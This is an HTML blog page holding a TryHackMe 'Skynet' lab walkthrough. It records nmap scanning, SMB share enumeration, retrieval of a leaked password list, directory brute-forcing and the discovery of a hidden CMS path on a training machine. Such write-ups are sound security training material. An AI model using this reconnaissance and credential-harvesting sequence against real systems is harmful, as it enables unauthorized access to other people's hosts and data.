@@ -1,0 +1,688 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748Crazyinside:~&#x2F;HTB$ sudo nmap -sC -sV 10.10.109.181 -p22,80,110,139,143,445 -oN Skynet -Pn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe Walkthrough - Skynet">
+<meta property="og:url" content="https://crazyinside.github.io/post/Tryhackme-Skynet.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748Crazyinside:~&#x2F;HTB$ sudo nmap -sC -sV 10.10.109.181 -p22,80,110,139,143,445 -oN Skynet -Pn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720140211930.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720211808317.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720212145262.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720213544122.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720214217633.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720214249272.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720214946709.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720215102870.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720223015224.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720223727997.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720224048199.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.065Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.055Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720140211930.png">
+  
+  
+  
+  <title>TryHackMe Walkthrough - Skynet - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TryHackMe Walkthrough - Skynet"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          97 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">TryHackMe Walkthrough - Skynet</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HTB$ sudo nmap -sC -sV 10.10.109.181 -p22,80,110,139,143,445 -oN Skynet -Pn                          255 ⨯</span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting Nmap 7.92SVN ( https://google.com ) at 2022-07-20 13:58 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.109.181</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)</span><br><span class="line">|   256 57c07502712d193183dbe4fe679668cf (ECDSA)</span><br><span class="line">|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Skynet</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING SASL AUTH-RESP-CODE TOP RESP-CODES CAPA UIDL</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: ENABLE LOGIN-REFERRALS post-login have more listed SASL-IR capabilities OK LOGINDISABLEDA0001 Pre-login IDLE ID IMAP4rev1 LITERAL+</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2022-07-20T05:58:19</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: skynet</span><br><span class="line">|   NetBIOS computer name: SKYNET\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: skynet</span><br><span class="line">|_  System time: 2022-07-20T00:58:19-05:00</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 25.58 seconds</span><br><span class="line">zsh: segmentation fault  sudo nmap -sC -sV 10.10.109.181 -p22,80,110,139,143,445 -oN Skynet -Pn</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HTB$ smbmap -H 10.10.109.181 -u <span class="built_in">whoami</span>                                </span><br><span class="line">[+] Guest session       IP: 10.10.109.181:445   Name: 10.10.109.181                                     </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        <span class="built_in">print</span>$                                                  NO ACCESS       Printer Drivers</span><br><span class="line">        anonymous                                               READ ONLY       Skynet Anonymous Share</span><br><span class="line">        milesdyson                                              NO ACCESS       Miles Dyson Personal Share</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))</span><br><span class="line">                                                                                                                      </span><br><span class="line">Crazyinside:~/HTB$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HTB$ smbclient //10.10.109.181/anonymous -U <span class="built_in">whoami</span></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\<span class="built_in">whoami</span>]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Fri Nov 27 00:04:00 2020</span><br><span class="line">  ..                                  D        0  Tue Sep 17 15:20:17 2019</span><br><span class="line">  attention.txt                       N      163  Wed Sep 18 11:04:59 2019</span><br><span class="line">  logs                                D        0  Wed Sep 18 12:42:16 2019</span><br><span class="line"></span><br><span class="line">                9204224 blocks of size 1024. 5831512 blocks available</span><br><span class="line">smb: \&gt; mget attention.txt </span><br><span class="line">Get file attention.txt? y</span><br><span class="line">getting file \attention.txt of size 163 as attention.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> logs</span><br><span class="line">smb: \logs\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Wed Sep 18 12:42:16 2019</span><br><span class="line">  ..                                  D        0  Fri Nov 27 00:04:00 2020</span><br><span class="line">  log2.txt                            N        0  Wed Sep 18 12:42:13 2019</span><br><span class="line">  log1.txt                            N      471  Wed Sep 18 12:41:59 2019</span><br><span class="line">  log3.txt                            N        0  Wed Sep 18 12:42:16 2019</span><br><span class="line"></span><br><span class="line">                9204224 blocks of size 1024. 5831512 blocks available</span><br><span class="line">smb: \logs\&gt; mget *</span><br><span class="line">Get file log2.txt? y</span><br><span class="line">getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span><br><span class="line">Get file log1.txt? y</span><br><span class="line">getting file \logs\log1.txt of size 471 as log1.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br><span class="line">Get file log3.txt? y</span><br><span class="line">getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span><br><span class="line">smb: \logs\&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HTB$ <span class="built_in">cat</span> <span class="built_in">log</span>*.txt</span><br><span class="line">cyborg007haloterminator</span><br><span class="line">terminator22596</span><br><span class="line">terminator219</span><br><span class="line">terminator20</span><br><span class="line">terminator1989</span><br><span class="line">terminator1988</span><br><span class="line">terminator168</span><br><span class="line">terminator16</span><br><span class="line">terminator143</span><br><span class="line">terminator13</span><br><span class="line">terminator123!@<span class="comment">#</span></span><br><span class="line">terminator1056</span><br><span class="line">terminator101</span><br><span class="line">terminator10</span><br><span class="line">terminator02</span><br><span class="line">terminator00</span><br><span class="line">roboterminator</span><br><span class="line">pongterminator</span><br><span class="line">manasturcaluterminator</span><br><span class="line">exterminator95</span><br><span class="line">exterminator200</span><br><span class="line">dterminator</span><br><span class="line">djxterminator</span><br><span class="line">dexterminator</span><br><span class="line">determinator</span><br><span class="line">cyborg007haloterminator</span><br><span class="line">avsterminator</span><br><span class="line">alonsoterminator</span><br><span class="line">Walterminator</span><br><span class="line">79terminator6</span><br><span class="line">1996terminator</span><br><span class="line">                                                                                                                      </span><br><span class="line">Crazyinside:~/HTB$ <span class="built_in">cat</span> attention.txt </span><br><span class="line">A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.</span><br><span class="line">-Miles Dyson</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720140211930.png" srcset="/img/loading.gif" lazyload alt="image-20220720140211930"></p>
+<p>访问80端口只有一个假的搜索页面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[21:08:44] Starting: </span><br><span class="line">[21:08:48] 301 -  309B  - /js  -&gt;  http://10.10.27.117/js/</span><br><span class="line">[21:08:56] 403 -  277B  - /.ht_wsr.txt</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccess.bak1</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccess.orig</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccess.save</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccess.sample</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccess_extra</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccess_sc</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccess_orig</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccessBAK</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccessOLD2</span><br><span class="line">[21:08:57] 403 -  277B  - /.htaccessOLD</span><br><span class="line">[21:08:57] 403 -  277B  - /.html</span><br><span class="line">[21:08:57] 403 -  277B  - /.htm</span><br><span class="line">[21:08:57] 403 -  277B  - /.htpasswd_test</span><br><span class="line">[21:08:57] 403 -  277B  - /.htpasswds</span><br><span class="line">[21:08:57] 403 -  277B  - /.httr-oauth</span><br><span class="line">[21:09:00] 403 -  277B  - /.php</span><br><span class="line">[21:09:00] 403 -  277B  - /.php3</span><br><span class="line">[21:09:23] 301 -  312B  - /admin  -&gt;  http://10.10.27.117/admin/</span><br><span class="line">[21:09:24] 403 -  277B  - /admin/.htaccess</span><br><span class="line">[21:09:24] 403 -  277B  - /admin/?/login</span><br><span class="line">[21:09:25] 403 -  277B  - /admin/</span><br><span class="line">[21:09:55] 301 -  313B  - /config  -&gt;  http://10.10.27.117/config/</span><br><span class="line">[21:09:56] 403 -  277B  - /config/</span><br><span class="line">[21:09:59] 301 -  310B  - /css  -&gt;  http://10.10.27.117/css/</span><br><span class="line">[21:10:18] 200 -  523B  - /index.html</span><br><span class="line">[21:10:21] 403 -  277B  - /js/</span><br><span class="line">[21:10:55] 403 -  277B  - /server-status/</span><br><span class="line">[21:10:55] 403 -  277B  - /server-status</span><br><span class="line">[21:11:01] 301 -  319B  - /squirrelmail  -&gt;  http://10.10.27.117/squirrelmail/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720211808317.png" srcset="/img/loading.gif" lazyload alt="image-20220720211808317"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720212145262.png" srcset="/img/loading.gif" lazyload alt="image-20220720212145262"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720213544122.png" srcset="/img/loading.gif" lazyload alt="image-20220720213544122"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720214217633.png" srcset="/img/loading.gif" lazyload alt="image-20220720214217633"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720214249272.png" srcset="/img/loading.gif" lazyload alt="image-20220720214249272"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HTB$ smbclient //10.10.27.117/milesdyson -U milesdyson                                                                                                                                                                     130 ⨯</span><br><span class="line"></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\milesdyson]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Sep 17 17:05:47 2019</span><br><span class="line">  ..                                  D        0  Wed Sep 18 11:51:03 2019</span><br><span class="line">  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 17:05:14 2019</span><br><span class="line">  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 17:05:14 2019</span><br><span class="line">  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 17:05:14 2019</span><br><span class="line">  notes                               D        0  Tue Sep 17 17:18:40 2019</span><br><span class="line">  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 17:05:14 2019</span><br><span class="line">  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 17:05:14 2019</span><br><span class="line"></span><br><span class="line">                9204224 blocks of size 1024. 5827844 blocks available</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720214946709.png" srcset="/img/loading.gif" lazyload alt="image-20220720214946709"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HTB/notes$ <span class="built_in">cat</span> important.txt </span><br><span class="line"></span><br><span class="line">1. Add features to beta CMS /45kra24zxs28v3yd</span><br><span class="line">2. Work on T-800 Model 101 blueprints</span><br><span class="line">3. Spend more time with my wife</span><br><span class="line">                                                                                                                                                                                                                                               </span><br><span class="line">Crazyinside:~/HTB/notes$ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720215102870.png" srcset="/img/loading.gif" lazyload alt="image-20220720215102870"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[21:51:48] Starting: </span><br><span class="line">[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.ht_wsr.txt</span><br><span class="line">[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess.bak1</span><br><span class="line">[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess.orig</span><br><span class="line">[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess.save</span><br><span class="line">[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess.sample</span><br><span class="line">[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess_extra</span><br><span class="line">[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess_orig</span><br><span class="line">[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess_sc</span><br><span class="line">[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccessBAK</span><br><span class="line">[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htaccessOLD</span><br><span class="line">[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htaccessOLD2</span><br><span class="line">[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htm</span><br><span class="line">[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.html</span><br><span class="line">[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htpasswd_test</span><br><span class="line">[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htpasswds</span><br><span class="line">[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.httr-oauth</span><br><span class="line">[21:52:04] 403 -  277B  - /45kra24zxs28v3yd/.php</span><br><span class="line">[21:52:04] 403 -  277B  - /45kra24zxs28v3yd/.php3</span><br><span class="line">[21:52:48] 301 -  337B  - /45kra24zxs28v3yd/administrator  -&gt;  http://10.10.27.117/45kra24zxs28v3yd/administrator/</span><br><span class="line">[21:52:48] 403 -  277B  - /45kra24zxs28v3yd/administrator/.htaccess</span><br><span class="line">[21:52:48] 200 -    5KB - /45kra24zxs28v3yd/administrator/</span><br><span class="line">[21:52:48] 200 -    5KB - /45kra24zxs28v3yd/administrator/index.php</span><br><span class="line">[21:53:26] 200 -  418B  - /45kra24zxs28v3yd/index.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720223015224.png" srcset="/img/loading.gif" lazyload alt="image-20220720223015224"></p>
+<p>刚刚的密码账号不能用。</p>
